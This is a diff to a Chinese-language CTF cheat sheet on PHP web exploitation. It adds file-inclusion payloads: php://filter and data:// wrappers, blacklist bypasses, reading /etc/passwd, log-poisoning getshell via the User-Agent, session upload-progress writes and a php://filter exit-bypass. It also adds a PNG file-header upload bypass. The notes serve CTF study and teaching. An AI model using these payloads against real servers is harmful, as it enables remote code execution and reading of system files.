@@ -306,7 +306,9 @@ $iterator = new FilesystemIterator('.'); // 创建当前目录的迭代器,默�
 getcwd()//获取当前工作目录
 ```
 
-# 七、伪协议(文件包含)
+# 七、文件包含
+常用包含/etc/passwd来查看回显
+## 伪协议
 ?file=php://
 fuzz一下所有的伪协议
 ```php
@@ -316,6 +318,7 @@ file_put_contents($v3,$str);//$str进行base64编码
 $v3=php://filter/write=convert.base64-decode/resource=1.php
 若base64在黑名单，可绕过：
 php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
+
 php://filter/read=convert.quoted-printable-encode/resource=flag.php
 若php://在黑名单：
 compress.zlib://flag.php
@@ -326,9 +329,26 @@ ldap://
 tftp://
 gopher://
 data:text/plain,<?php phpinfo();?> //可去掉双斜杠
+data://text/plain;base64,poc
 ```
 ![20220530222004](https://s2.loli.net/2022/05/30/m8KGvD1UWVBpZe6.png)
-
+## 日志getshell
+先在user-agent写shell，url不带参数
+再包含/var/log/nginx/access.log
+## 利用session对话
+php中的session.upload_progress，当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中
+session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session
+利用PHP_SESSION_UPLOAD_PROGRESS=""把内容写入/tmp/sess_TGAO
+## 利用php://filter绕开exit
+```php
+$content = '<?php exit; ?>';
+$content .= $_POST['txt'];
+file_put_contents($_POST['filename'], $content);
+php://filter/write=string.strip_tags|convert.base64-decode/resource=1.php
+php://filter/write=string.rot13/resource=1.php
+```
+>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码
+>先strip_tags绕exit，再用base64还原
 # 八、变量
 ## 全局变量
 flag In the variable 
@@ -534,6 +554,8 @@ os.system('find /* |grep flag')
 ./ ../ /
 在文件名后面加/
 ```
+## 文件头绕过
+31 31 31=>89 50 4e 47 0d 0a
 ## .htaccess解析绕过
 ```
 AddType application/x-httpd-php .png
@@ -582,9 +604,7 @@ ctf=/var/log/nginx/access.log   ctf=/var/log/apache/access.log
 ![20220607212037](https://s2.loli.net/2022/06/07/kMV7Hl6ONaWYJDU.png)
 ![20220607212052](https://s2.loli.net/2022/06/07/OL675yudzZkmgXa.png)
 
-# 十一、文件包含
-常用包含/etc/passwd来查看回显
-# 十二、反序列化
+# 十一、反序列化
 序列化只保留成员变量不保留函数方法，所以修改也只能修改变量
 ```php
 O:11:"ctfShowUser":3:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxa";s:5:"isVip";b:1;}
